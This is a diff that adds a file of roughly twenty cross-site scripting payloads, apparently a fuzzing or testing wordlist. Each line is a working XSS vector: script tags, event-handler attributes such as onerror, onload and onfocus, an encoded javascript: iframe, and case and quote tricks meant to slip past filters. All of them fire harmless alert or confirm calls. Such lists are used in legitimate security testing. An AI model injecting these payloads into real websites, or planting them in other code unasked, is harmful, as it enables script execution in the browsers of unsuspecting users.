@@ -1,0 +1,21 @@
+"><!'/*"*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //>#
+<script>(alert)(1)</script>
+">"><h1/style="color:red"/onclIck=[document.domain].find(alert);>XSS</h1>
+''";><></script><svg/onload=confirm(1);>
+<iframe src="javascript:%61%6c%65%72%74%28%32%29"></iframe>
+"><iMg SrC=x OnErroR='prompt(document.domain)';>
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+<body onload=alert(/XSS/.source)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video src=_ onloadstart="alert(1)">
+<details/open/ontoggle="alert`1`">
+<audio src onloadstart=alert(1)>
+<marquee onstart=alert(1)>
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+</style></scRipt><scRipt>alert(1)</scRipt>
